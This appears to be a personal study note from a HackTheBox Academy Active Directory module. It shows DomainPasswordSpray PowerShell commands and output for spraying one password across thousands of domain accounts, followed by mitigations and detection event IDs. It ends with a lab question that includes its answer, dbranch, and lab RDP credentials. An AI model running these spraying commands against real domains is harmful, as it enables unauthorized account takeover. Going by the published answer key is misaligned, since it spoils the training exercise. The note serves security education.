# Internal Password Spraying - from Windows
From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain.

## Using DomainPasswordSpray.ps1
Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `-Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.

```pwsh
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

## Mitigations

<table class="bg-neutral-800 text-primary w-full mb-6 rounded-lg"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Technique</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Description</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Multi-factor Authentication</code></td><td class="p-4">Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Restricting Access</code></td><td class="p-4">It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Reducing Impact of Successful Exploitation</code></td><td class="p-4">A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Password Hygiene</code></td><td class="p-4">Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.</td></tr></tbody></table>

## Detection
In the Domain Controller’s security log, many instances of event ID 4625: An account failed to log on over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID 4771: Kerberos pre-authentication failed, which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging.

## External Password Spraying
Some common targets include:

- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication


## Questions
RDP to **10.129.35.30** (ACADEMY-EA-MS01), with user `htb-student` and password `Academy_student_AD!`
1. Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer. **Answer: dbranch**
   - `$ xfreerdp /v:10.129.35.30 /u:htb-student /p:Academy_student_AD!` → RDP to the target machine
   - Use the DomainPasswordSpray tool to automatically create a user list and perform password spraying on the Domain Controller, since we are authenticated to a domain:
        ```sh
        PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
        PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
        [*] Current domain is compatible with Fine-Grained Password Policy.
        [*] Now creating a list of users to spray...
        [*] The smallest lockout threshold discovered in the domain is 5 login attempts.
        [*] Removing disabled users from list.
        [*] There are 2940 total users found.
        [*] Removing users within 1 attempt of locking out from list.
        [*] Created a userlist containing 2940 users gathered from the current user's domain
        [*] The domain password policy observation window is set to  minutes.
        [*] Setting a  minute wait in between sprays.

        Confirm Password Spray
        Are you sure you want to perform a password spray against 2940 accounts?
        [Y] Yes  [N] No  [?] Help (default is "Y"): Y
        [*] Password spraying has begun with  1  passwords
        [*] This might take a while depending on the total number of users
        [*] Now trying password Winter2022 against 2940 users. Current time is 3:09 AM
        [*] Writing successes to spray_success
        [*] SUCCESS! User:dbranch Password:Winter2022
        ```
  